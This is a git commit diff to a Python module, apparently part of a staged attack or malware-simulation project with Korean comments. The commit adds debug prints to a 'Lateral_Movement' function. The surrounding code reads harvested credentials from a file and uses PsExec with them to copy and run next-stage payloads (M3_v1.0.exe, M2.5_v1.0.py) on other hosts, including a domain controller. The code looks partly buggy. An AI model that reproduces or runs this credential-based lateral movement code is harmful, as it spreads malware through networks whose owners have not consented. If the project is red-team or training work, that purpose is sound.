6e6de277d158e82e3a15d898d3c895479725915d
kdw9805 <35162059+kdw9805@users.noreply.github.com>
2022-10-29 00:36:09 +0900

    Update M2_v1.0.py

--- M2_v1.0.py
+++ M2_v1.0.py
@@ -198,21 +198,29 @@ def net_Discovery():
 # 5. 내부 이동
 def Lateral_Movement():
     try:
+        print('1')
         IpDiscovery_path = set_path + '\IpDiscovery'
+        
+        print('2')
         # 리스트 길이(연결된 DNS 수) 만큼에 psexec 실행하여 DC로 이동 후 모듈3 전송
         f = open('C:\module2\GetCredential\Credential_use_500.txt',
                  'r', encoding='UTF-8')
+        print('2-1')
         line = f.readlines()
         for i in range(len(list)):
             lines = line[0].split(".")
             return_code = subprocess.Popen('C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
                                            list[i] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2\DownloadFile-main\M3_v1.0.exe')
+        print('2-2')
         f.close()
-
+        print('2-3')
+        
+        print('3')
         # 현재 pc와 리스트의 DNS가 같을 때 리스트의 다음 DNS로 측면이동 모듈2.5 전송
         f = open('C:\module2.5\GetCredential\Credential_use_500.txt',
                  'r', encoding='UTF-8')
         f1 = open(IpDiscovery_path + '\IpDiscovery_hostname.txt', 'r')
+        print('3-1')
         line = f.readlines()
         line1 = f1.readlines()
         name = line1[0].split()
@@ -223,8 +231,10 @@ def Lateral_Movement():
                 for j in range(len(list)-1):
                     return_code = os.system('start cmd /k C:\module2.5\DownloadFile-main\PsExec.exe -s \\\\' +
                                             list[j+1] + ',\\\\' + list[j+2] + ',\\\\' + list[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2.5\DownloadFile-main\M2.5_v1.0.py')
+        print('3-2')
         f.close()
         f1.close()
+        print('3-3')
         info_List.append(('Lateral Movement', 'Ok'))
     except:
         info_List.append(('Lateral Movement', 'No'))
